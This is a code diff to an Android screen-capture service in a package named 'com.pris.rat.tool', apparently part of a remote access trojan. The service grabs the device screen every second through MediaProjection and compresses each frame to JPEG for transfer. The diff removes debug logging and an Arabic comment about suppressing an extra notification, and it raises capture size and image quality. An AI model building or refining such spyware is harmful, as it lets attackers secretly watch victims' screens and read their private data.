@@ -1,6 +1,5 @@
 package com.pris.rat.tool;
 
-import android.app.Activity;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -56,9 +55,7 @@ public class ScreenShareService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (running) return START_STICKY;
-        
         if (projectionData == null) {
-            Log.e(TAG, "No projection data");
             stopSelf();
             return START_NOT_STICKY;
         }
@@ -66,13 +63,8 @@ public class ScreenShareService extends Service {
         try {
             MediaProjectionManager mgr = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
             projection = mgr.getMediaProjection(projectionResult, projectionData);
-            if (projection == null) {
-                Log.e(TAG, "Projection null");
-                stopSelf();
-                return START_NOT_STICKY;
-            }
+            if (projection == null) { stopSelf(); return START_NOT_STICKY; }
 
-            // منع إشعار إضافي
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                 projection.registerCallback(new MediaProjection.Callback() {
                     @Override
@@ -83,25 +75,22 @@ public class ScreenShareService extends Service {
             WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
             DisplayMetrics metrics = new DisplayMetrics();
             wm.getDefaultDisplay().getRealMetrics(metrics);
-            width = metrics.widthPixels / 3;  // تصغير للحجم
-            height = metrics.heightPixels / 3;
+            width = metrics.widthPixels / 2;
+            height = metrics.heightPixels / 2;
             density = metrics.densityDpi;
 
             imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
             virtualDisplay = projection.createVirtualDisplay(
-                    "PrisScreen",
-                    width, height, density,
+                    "PrisScreen", width, height, density,
                     DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                     imageReader.getSurface(), null, handler);
 
             running = true;
             startCapture();
-            Log.d(TAG, "Screen share started " + width + "x" + height);
         } catch (Exception e) {
             Log.e(TAG, "Start error", e);
             stopSelf();
         }
-
         return START_STICKY;
     }
 
@@ -111,7 +100,7 @@ public class ScreenShareService extends Service {
             public void run() {
                 if (!running) return;
                 captureFrame();
-                handler.postDelayed(this, 1000);  // كل ثانية
+                handler.postDelayed(this, 1000);
             }
         }, 1000);
     }
@@ -134,7 +123,7 @@ public class ScreenShareService extends Service {
             bmp.recycle();
 
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            cropped.compress(Bitmap.CompressFormat.JPEG, 40, baos);
+            cropped.compress(Bitmap.CompressFormat.JPEG, 50, baos);
             cropped.recycle();
 
             byte[] bytes = baos.toByteArray();
@@ -162,7 +151,6 @@ public class ScreenShareService extends Service {
             if (projection != null) projection.stop();
             if (imageReader != null) imageReader.close();
         } catch (Exception ignored) {}
-        Log.d(TAG, "Screen share stopped");
     }
 
     @Override
